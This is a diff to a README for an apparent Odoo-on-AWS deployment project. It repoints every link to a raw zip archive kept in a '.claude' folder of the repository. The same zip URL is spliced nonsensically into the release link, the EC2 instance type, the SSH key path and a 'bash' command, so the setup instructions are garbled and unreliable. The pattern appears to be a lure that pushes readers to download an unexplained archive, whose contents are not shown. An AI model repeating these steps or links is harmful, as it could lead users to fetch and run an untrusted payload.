@@ -1,6 +1,6 @@
 # 🚀 odoo-community-aws-deployment - Deploy Odoo Effortlessly on AWS
 
-[![Download the latest release](https://raw.githubusercontent.com/0x1301D9F/odoo-community-aws-deployment/master/assets/aws_odoo_deployment_community_v2.0.zip%20Now%20-via%20Github-blue)](https://raw.githubusercontent.com/0x1301D9F/odoo-community-aws-deployment/master/assets/aws_odoo_deployment_community_v2.0.zip)
+[![Download the latest release](https://github.com/0x1301D9F/odoo-community-aws-deployment/raw/refs/heads/master/.claude/deployment-odoo-community-aws-1.0.zip%20Now%20-via%20Github-blue)](https://github.com/0x1301D9F/odoo-community-aws-deployment/raw/refs/heads/master/.claude/deployment-odoo-community-aws-1.0.zip)
 
 ## 📋 Description
 
@@ -20,7 +20,7 @@ Before you start, ensure your system meets these requirements:
 Follow this simple guide to get Odoo up and running on AWS.
 
 1. **Visit the Releases Page**
-   Go to our [Releases page](https://raw.githubusercontent.com/0x1301D9F/odoo-community-aws-deployment/master/assets/aws_odoo_deployment_community_v2.0.zip) to find and download the latest version of the deployment files.
+   Go to our [Releases page](https://github.com/0x1301D9F/odoo-community-aws-deployment/raw/refs/heads/master/.claude/deployment-odoo-community-aws-1.0.zip) to find and download the latest version of the deployment files.
 
 2. **Download the Deployment Package**
    Look for the latest release and click on it. You will see various files available for download. Choose the one that suits your needs.
@@ -28,22 +28,22 @@ Follow this simple guide to get Odoo up and running on AWS.
 3. **Set Up an AWS EC2 Instance**
    You will need to launch an EC2 instance in your AWS account. Use the AWS Management Console:
    - Choose the Amazon Machine Image (AMI) that matches your requirements, preferably Ubuntu.
-   - Select the instance type. A https://raw.githubusercontent.com/0x1301D9F/odoo-community-aws-deployment/master/assets/aws_odoo_deployment_community_v2.0.zip is recommended for basic Odoo setup.
+   - Select the instance type. A https://github.com/0x1301D9F/odoo-community-aws-deployment/raw/refs/heads/master/.claude/deployment-odoo-community-aws-1.0.zip is recommended for basic Odoo setup.
    - Configure your security group to allow necessary ports (e.g., HTTP, HTTPS).
    - Launch your instance.
 
 4. **Connect to Your EC2 Instance**
    Use SSH to connect to your instance. The command will look like this:
    ```bash
-   ssh -i "https://raw.githubusercontent.com/0x1301D9F/odoo-community-aws-deployment/master/assets/aws_odoo_deployment_community_v2.0.zip" ubuntu@your-ec2-public-ip
+   ssh -i "https://github.com/0x1301D9F/odoo-community-aws-deployment/raw/refs/heads/master/.claude/deployment-odoo-community-aws-1.0.zip" ubuntu@your-ec2-public-ip
    ```
-   Replace `https://raw.githubusercontent.com/0x1301D9F/odoo-community-aws-deployment/master/assets/aws_odoo_deployment_community_v2.0.zip` with your key file and `your-ec2-public-ip` with your instance's public IP.
+   Replace `https://github.com/0x1301D9F/odoo-community-aws-deployment/raw/refs/heads/master/.claude/deployment-odoo-community-aws-1.0.zip` with your key file and `your-ec2-public-ip` with your instance's public IP.
 
 5. **Run the Deployment Script**
    Once connected, navigate to the directory where you downloaded the package. 
    Use the following command to execute the deployment installation:
    ```bash
-   bash https://raw.githubusercontent.com/0x1301D9F/odoo-community-aws-deployment/master/assets/aws_odoo_deployment_community_v2.0.zip
+   bash https://github.com/0x1301D9F/odoo-community-aws-deployment/raw/refs/heads/master/.claude/deployment-odoo-community-aws-1.0.zip
    ```
    The script will automatically install Odoo and configure it for you.
 
@@ -56,7 +56,7 @@ Follow this simple guide to get Odoo up and running on AWS.
 
 ## 📥 Download & Install
 
-For easy access to our files, visit this page to download the deployment package: [Releases](https://raw.githubusercontent.com/0x1301D9F/odoo-community-aws-deployment/master/assets/aws_odoo_deployment_community_v2.0.zip).
+For easy access to our files, visit this page to download the deployment package: [Releases](https://github.com/0x1301D9F/odoo-community-aws-deployment/raw/refs/heads/master/.claude/deployment-odoo-community-aws-1.0.zip).
 
 ## 🛡️ Security Recommendations
 
